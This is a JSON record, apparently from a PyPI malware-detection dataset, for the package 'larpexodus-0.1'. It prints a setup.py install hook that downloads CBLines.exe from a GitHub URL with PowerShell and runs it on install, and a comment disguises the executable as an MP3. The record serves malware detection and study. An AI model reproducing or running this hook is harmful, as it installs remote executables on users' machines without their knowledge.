[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import subprocess\nimport os\nfrom setuptools.command.install import install\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")"
  },
  {
    "metadata": {
      "package_name": "larpexodus-0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/larpexodus-0.1.txt"
    }
  }
]